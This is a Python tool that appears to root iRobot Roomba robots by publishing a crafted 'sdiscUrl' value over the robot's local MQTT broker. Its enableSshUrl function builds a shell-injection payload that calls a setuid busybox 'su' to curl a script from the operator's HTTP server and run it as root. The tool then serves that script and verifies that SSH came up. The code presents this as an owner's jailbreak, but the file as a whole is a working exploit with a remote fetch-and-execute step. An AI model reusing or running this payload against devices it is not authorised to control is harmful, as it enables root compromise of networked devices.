import argparse
import json
import math
import os
import socket
import ssl
import sys
import threading
import time
import re
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer as HTTPServer
from typing import cast

import paho.mqtt.client as mqtt
from paho.mqtt.enums import CallbackAPIVersion

# connectivity_manager rejects any sdiscUrl longer than this (cmp r0,0xbf at 0x101d0).
SDISCURL_MAX_BYTES = 191

def get_local_ip(robot_ip: str) -> str:
    """Ask the OS for the route's source address; UDP connect sends no packet."""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect((ipv4_address(robot_ip), 8883))
        return ipv4_address(s.getsockname()[0])
    finally:
        s.close()

httpd : HTTPServer|None = None

LOCAL_IP = None
mqttc = None
CONNECT_TIMEOUT = 10.0
PUBLISH_TIMEOUT = 5.0
CLEANUP_TIMEOUT = 1.0
RESOLVE_TIMEOUT = 5.0
WIFICTL = "wifictl"
RUNJAILED_HOME = "/data/opt/irobot/persistent/opt/runjailed"
AVAILABLE_CMD_SPACE = 1

def sendCmd(cmd: str):
    """Publish state.sdiscUrl on the external wifictl topic.

    The owner's successful firmware handoff reports that local_manager unwraps
    state and forwards to local/delta. The internal topic is not the external one.

    True only means Paho accepted the publish locally. It does not confirm
    broker delivery, robot processing, or shell execution.
    """
    return _publish_cmd(cmd).rc == mqtt.MQTT_ERR_SUCCESS


def _publish_cmd(cmd: str):
    """Keep MQTTMessageInfo so the CLI can wait for the complete local send."""
    if not isinstance(cmd, str) or len(cmd.encode()) > SDISCURL_MAX_BYTES:
        raise ValueError("cmd must be a string of at most 191 bytes")
    if mqttc is None:
        raise RuntimeError("MQTT client is not initialized")
    # local_manager accepts only fixed header 0x30: QoS 0, no RETAIN/DUP.
    return mqttc.publish(WIFICTL, json.dumps({"state": {"sdiscUrl": cmd}}), qos=0, retain=False)

def sendChunkedCommand(cmd: str, file: str|None = "I", display: str|None = None):
    raise NotImplementedError("Legacy chunking is unsupported; use --enable-ssh")


def runAsRoot(cmd: str, file:str="I"):
    raise NotImplementedError("Legacy root helper is unsupported; use --enable-ssh")


def ipv4_address(host: str) -> str:
    """Only canonical unicast IPv4 literals may enter shell arguments."""
    import ipaddress
    try:
        address = ipaddress.IPv4Address(host)
        if address.is_unspecified or int(address) >= 0xe0000000:
            raise ValueError
    except (ValueError, TypeError):
        raise ValueError("host must be a unicast IPv4 address") from None
    return str(address)


def resolve_callback(host: str, allow_dns: bool = True) -> str:
    """Resolve once on the host; only a validated numeric address enters shell.

    DNS is bounded and ambiguous multi-address answers are rejected. --dry-run
    refuses DNS altogether, so it needs an explicit literal callback address.
    """
    try:
        return ipv4_address(host)
    except ValueError:
        pass
    if not allow_dns:
        raise ValueError("dry-run requires a literal callback IPv4 address")
    labels = host.rstrip(".").split(".")
    if (len(host) > 253 or not re.search(r"[A-Za-z]", host) or
            any(not re.fullmatch(r"[A-Za-z0-9](?:[A-Za-z0-9-]{0,61}[A-Za-z0-9])?", label)
                for label in labels)):
        raise ValueError("invalid callback hostname or IPv4 address")
    answers = []
    errors = []
    done = threading.Event()

    def resolve():
        try:
            answers.extend(socket.getaddrinfo(host, None, socket.AF_INET, socket.SOCK_STREAM))
        except OSError as exc:
            errors.append(exc)
        finally:
            done.set()

    threading.Thread(target=resolve, daemon=True).start()
    if not done.wait(RESOLVE_TIMEOUT):
        raise TimeoutError("callback hostname resolution timed out; pass a literal IPv4")
    if errors:
        raise ValueError("callback hostname resolution failed; pass a literal IPv4")
    addresses = {ipv4_address(answer[4][0]) for answer in answers}
    if len(addresses) != 1:
        raise ValueError("callback hostname must resolve to exactly one IPv4; pass a literal address")
    return addresses.pop()


def valid_port(port) -> int:
    if not isinstance(port, int) or isinstance(port, bool) or not 1 <= port <= 65535:
        raise ValueError("port must be an integer between 1 and 65535")
    return port


def enableSshUrl(host: str, port: int = 8883, beacon_port: int | None = None) -> str:
    """Build the owner's curl + setuid-root bootstrap, not a firmware probe.

    Both files and beacons use the same HTTP listener. A failed curl must not
    execute a stale /tmp/e. The complete field, not just its command, is bounded.
    """
    host = ipv4_address(host)
    port = valid_port(port)
    if beacon_port is not None and beacon_port != port:
        raise ValueError("downloads and beacons must use the same port")
    fetch = (f"/usr/bin/curl -fsS -m15 -o /tmp/e http://{host}:{port}/enableSSH.sh"
             f"&&sh /tmp/e {host} {port}")
    url = f"https://$(/bin/busybox.suid su -c '{fetch}')"
    if len(url.encode()) > SDISCURL_MAX_BYTES:
        raise ValueError(f"payload is {len(url.encode())} bytes, max {SDISCURL_MAX_BYTES}")
    return url


class ConnectionState:
    def __init__(self):
        self.connack = threading.Event()
        self.disconnected = threading.Event()
        self.accepted = False
        self.error = None


def on_connect(client, userdata, flags, reason_code, properties):
    userdata.accepted = reason_code == 0
    if userdata.accepted:
        print("Connected successfully!", flush=True)
        client.subscribe("$SYS/#")
    else:
        userdata.error = f"MQTT connection rejected: {reason_code}"
    userdata.connack.set()


def on_disconnect(client, userdata, disconnect_flags, reason_code, properties):
    userdata.error = f"MQTT disconnected: {reason_code}"
    userdata.disconnected.set()
    # Wake the initial waiter even if no CONNACK arrived.
    userdata.connack.set()


def _check_connection(state):
    if state.disconnected.is_set():
        raise RuntimeError(state.error or "MQTT disconnected")


def on_message(client, userdata, msg):
    # $SYS/# and other broker traffic is not JSON; do not kill the network loop.
    if "shadow/update" not in msg.topic:
        return
    try:
        pl = json.loads(msg.payload)
        robotDat = pl['state']['reported']
    except (ValueError, KeyError, TypeError):
        return
    print("Discovered: " + robotDat.get('sku', '?') + " on " + robotDat.get('softwareVer', '?'))


class DeviceEvidence:
    """Attempt-local HTTP observations, attributed to the configured robot IP.

    These are not authenticated attestations; use a trusted LAN. A beacon is
    never independently proof of privilege or a working SSH service.
    """
    REQUIRED = ("/enableSSH.sh", "/whoami/root", "/sshd.socket", "/done/ssh")

    def __init__(self, robot_ip):
        self.robot_ip = ipv4_address(robot_ip)
        self._lock = threading.Lock()
        self._active = False
        self._attempt = 0
        self._paths = set()

    def arm(self):
        with self._lock:
            self._paths.clear()
            self._attempt += 1
            self._active = True

    def ticket(self):
        with self._lock:
            return self._attempt if self._active else None

    def record(self, path, source, ticket):
        with self._lock:
            if ticket == self._attempt and self._active and source == self.robot_ip and path in self.REQUIRED:
                self._paths.add(path)

    def missing(self):
        with self._lock:
            return [path for path in self.REQUIRED if path not in self._paths]


def read_ssh_banner(host, port, timeout):
    """Read a complete SSH identification line with a total monotonic deadline."""
    deadline = time.monotonic() + timeout
    try:
        with socket.create_connection((ipv4_address(host), valid_port(port)), timeout=timeout) as sock:
            line = bytearray()
            for _ in range(4096):
                remaining = deadline - time.monotonic()
                if remaining <= 0:
                    return None
                sock.settimeout(remaining)
                byte = sock.recv(1)
                if not byte:
                    return None
                line.extend(byte)
                if len(line) > 255:
                    return None
                if byte == b"\n":
                    if line.startswith(b"SSH-"):
                        if re.fullmatch(rb"SSH-(?:2\.0|1\.99)-[!-~]+(?:[ -~]*)\r?\n", line):
                            return line.decode("ascii").rstrip("\r\n")
                        return None
                    line.clear()  # RFC 4253 permits pre-identification text.
    except (OSError, ValueError):
        return None
    return None


def verify_device(evidence, robot_ip, ssh_port, timeout, state):
    """Poll observations and SSH only; never reconnect or republish the payload."""
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        _check_connection(state)
        if not evidence.missing():
            banner = read_ssh_banner(robot_ip, ssh_port, min(1.0, deadline - time.monotonic()))
            _check_connection(state)
            if banner:
                return banner
        state.disconnected.wait(max(0, min(0.2, deadline - time.monotonic())))
    missing = evidence.missing()
    detail = ", ".join(missing) if missing else "SSH protocol banner"
    print(f"Device verification incomplete: missing {detail}. No automatic retry.",
          file=sys.stderr, flush=True)
    return None


class RunjailedHTTPHandler(BaseHTTPRequestHandler):
    """One HTTP port for allowlisted downloads and exact beacon endpoints."""
    def log_message(self, format, *args):
        pass

    def setup(self):
        super().setup()
        self.connection.settimeout(2)

    def do_GET(self):
        evidence = getattr(self.server, "evidence", None)
        ticket = evidence.ticket() if evidence is not None else None
        if evidence is not None and self.client_address[0] != evidence.robot_ip:
            self.send_error(403, "Not the configured robot")
            return
        if self.path in ("/enableSSH.sh", "/sshd.socket"):
            from pathlib import Path
            try:
                body = (Path(__file__).parent / "scripts" / self.path[1:]).read_bytes()
            except OSError:
                self.send_error(500, "Robot artifact unavailable")
                return
        elif self.path in ("/whoami/root", "/whoami/apps", "/done/ssh"):
            body = b"observed; not SSH verification\n"
        else:
            self.send_error(404)
            return
        self.send_response(200)
        self.send_header("Content-type", "text/plain")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)
        self.wfile.flush()
        if evidence is not None:
            evidence.record(self.path, self.client_address[0], ticket)
        print(f"HTTP observed {self.client_address[0]} {self.path}", flush=True)


def main():
    global LOCAL_IP, httpd, mqttc
    # Redirected stdout is block-buffered, which hides progress from callers polling the log.
    if hasattr(sys.stdout, "reconfigure"):
        sys.stdout.reconfigure(line_buffering=True)
    parser = argparse.ArgumentParser("runjailed")
    parser.add_argument("--ip", "-i", dest="ip", help="Your robot's IP", required=True, type=str)
    parser.add_argument("--blid", "-b", dest="blid", help="Your robot's BLID (or $ROOMBA_BLID)",
                        default=os.environ.get("ROOMBA_BLID"), type=str)
    parser.add_argument("--password", "-p", dest="password",
                        help="Your robot's password (or $ROOMBA_PASSWORD)",
                        default=os.environ.get("ROOMBA_PASSWORD"), type=str)
    parser.add_argument("--callback", "--host-ip", "-c", dest="cb",
                        help="This computer's LAN IPv4 or single-address hostname", type=str)
    parser.add_argument("--http-port", type=int, help="shared HTTP download/beacon port (default 8883)")
    parser.add_argument("--beacon-port", type=int, help="legacy alias for --http-port; must match")
    parser.add_argument("--ssh-port", type=int, default=22, help="SSH banner probe port (default 22)")
    parser.add_argument("--timeout", type=float, default=120,
                        help="bounded device-verification window after local send (default 120s)")
    parser.add_argument("--send", dest="send", action="append", default=[], metavar="URL",
                        help="publish state.sdiscUrl (repeatable); local send only, NOT device verification")
    parser.add_argument("--enable-ssh", dest="enable_ssh", nargs="?", const="auto", metavar="HOST[:PORT]",
                        help="serve, publish once and verify runtime SSH using the callback host")
    parser.add_argument("--dry-run", action="store_true",
                        help="print payload without credentials, DNS, sockets or publish; use literal IPv4")
    parser.add_argument("--send-delay", dest="send_delay", type=float, default=1.5,
                        help="seconds between manual sends (default 1.5)")
    parser.add_argument("--linger", dest="linger", type=float, default=15,
                        help="manual --send mode HTTP linger; SSH mode uses --timeout")

    args = parser.parse_args()
    if args.enable_ssh == "":
        parser.error("--enable-ssh host cannot be empty")
    for name in ("send_delay", "linger"):
        value = getattr(args, name)
        if not math.isfinite(value) or value < 0:
            parser.error(f"--{name.replace('_', '-')} must be finite and nonnegative")
    if not math.isfinite(args.timeout) or args.timeout <= 0:
        parser.error("--timeout must be finite and positive")
    try:
        args.ip = ipv4_address(args.ip)
        valid_port(args.ssh_port)
        specified_ports = [valid_port(p) for p in (args.http_port, args.beacon_port) if p is not None]
        if args.enable_ssh and args.send:
            raise ValueError("--enable-ssh cannot be mixed with --send")
        urls = list(args.send)
        for url in urls:
            if len(url.encode()) > SDISCURL_MAX_BYTES:
                raise ValueError("sdiscUrl must be at most 191 bytes")
        if args.enable_ssh:
            if args.enable_ssh == "auto":
                if args.dry_run and not args.cb:
                    raise ValueError("dry-run requires --host-ip with a literal IPv4")
                host = args.cb or get_local_ip(args.ip)
            else:
                host, separator, port = args.enable_ssh.partition(":")
                if separator:
                    specified_ports.append(valid_port(int(port)))
            LOCAL_IP = resolve_callback(host, allow_dns=not args.dry_run)
            if args.cb and args.cb != host and resolve_callback(args.cb, allow_dns=not args.dry_run) != LOCAL_IP:
                raise ValueError("--callback must match --enable-ssh host")
        elif args.cb:
            LOCAL_IP = resolve_callback(args.cb, allow_dns=not args.dry_run)
        elif args.dry_run:
            LOCAL_IP = ""
        else:
            LOCAL_IP = get_local_ip(args.ip)
        if len(set(specified_ports)) > 1:
            raise ValueError("downloads and beacons must use the same port")
        port = specified_ports[0] if specified_ports else 8883
        if args.enable_ssh:
            urls.append(enableSshUrl(LOCAL_IP, port))
    except (ValueError, OSError) as exc:
        parser.error(str(exc))

    if args.dry_run:
        if not urls:
            parser.error("--dry-run requires --send or --enable-ssh")
        print("DRY RUN: no services, DNS or publish; NOT device verification")
        for url in urls:
            print(f"wifictl MQTT 3.1.1 QoS0 retain=False bytes={len(url.encode())}: "
                  + json.dumps({"state": {"sdiscUrl": url}}))
        return 0
    if sys.stdin.isatty():
        import getpass
        if not args.blid:
            args.blid = input("BLID: ").strip()
        if not args.password:
            args.password = getpass.getpass("Robot password: ")
    if not args.blid:
        parser.error("--blid is required (or set ROOMBA_BLID)")
    if not args.password:
        parser.error("--password is required (or set ROOMBA_PASSWORD)")

    evidence = DeviceEvidence(args.ip)
    try:
        httpd = HTTPServer((LOCAL_IP, port), RunjailedHTTPHandler)
    except OSError as exc:
        print(f"HTTP listener failed: {exc}", file=sys.stderr, flush=True)
        return 1
    setattr(httpd, "evidence", evidence)
    t = threading.Thread(target=httpd.serve_forever, kwargs={"poll_interval": 0.1}, daemon=True)
    t.start()

    state = ConnectionState()
    mqttc = mqtt.Client(CallbackAPIVersion.VERSION2, userdata=state,
                        client_id=args.blid, protocol=mqtt.MQTTv311,
                        reconnect_on_failure=False)
    mqttc.on_connect = on_connect
    mqttc.on_message = on_message
    mqttc.on_disconnect = on_disconnect
    started = False
    try:
        mqttc.tls_set(cert_reqs=ssl.CERT_NONE)
        mqttc.tls_insecure_set(True) # Firmware certificate expired on Dec 31 2025.
        mqttc.username_pw_set(args.blid, args.password)
        mqttc.connect_timeout = CONNECT_TIMEOUT
        if mqttc.connect(args.ip, 8883, 60) != mqtt.MQTT_ERR_SUCCESS:
            raise RuntimeError("MQTT connect failed")
        if mqttc.loop_start() != mqtt.MQTT_ERR_SUCCESS:
            raise RuntimeError("MQTT network loop failed to start")
        started = True
        if not state.connack.wait(CONNECT_TIMEOUT):
            raise TimeoutError("MQTT CONNACK timed out")
        if not state.accepted:
            raise RuntimeError(state.error or "MQTT connection rejected")
        _check_connection(state)
        if not urls:
            # Preserve the original passive CLI mode when no send was requested.
            state.disconnected.wait()
            _check_connection(state)
        for index, url in enumerate(urls):
            _check_connection(state)
            if args.enable_ssh:
                evidence.arm()
            info = _publish_cmd(url)
            if info.rc != mqtt.MQTT_ERR_SUCCESS:
                raise RuntimeError(f"MQTT publish failed: rc={info.rc}")
            info.wait_for_publish(timeout=PUBLISH_TIMEOUT)
            if not info.is_published():
                raise TimeoutError("MQTT local send timed out")
            _check_connection(state)
            print(f"sendCmd locally sent bytes={len(url.encode())}: {url}", flush=True)
            if index + 1 < len(urls):
                state.disconnected.wait(args.send_delay)
                _check_connection(state)
        # QoS 0 confirms only local socket send, not broker/robot processing.
        if args.enable_ssh:
            banner = verify_device(evidence, args.ip, args.ssh_port, args.timeout, state)
            if banner is None:
                return 3
            print(f"[VERIFIED] Downloads + root beacon + done/ssh + SSH banner: {banner}", flush=True)
            return 0
        print("Local send complete; device execution NOT verified.", flush=True)
        if args.linger:
            print(f"listening for beacons for {args.linger:g}s ...", flush=True)
            state.disconnected.wait(args.linger)
        _check_connection(state)
        return 0
    except (OSError, ValueError, RuntimeError) as exc:
        print(f"MQTT failed: {exc}", file=sys.stderr, flush=True)
        return 1
    finally:
        try:
            mqttc.disconnect()
        finally:
            try:
                if started:
                    sock = cast(socket.socket | None, mqttc.socket())
                    if sock is not None and not state.disconnected.wait(CLEANUP_TIMEOUT):
                        # loop_stop joins Paho, which otherwise keeps draining an
                        # unwritable queue. Unblock its select/read on timeout.
                        try:
                            sock.shutdown(socket.SHUT_RDWR)
                        except OSError:
                            pass  # The network loop may already have closed it.
                    mqttc.loop_stop()
            finally:
                httpd.shutdown()
                httpd.server_close()
                t.join()


if __name__ == "__main__":
    sys.exit(main())
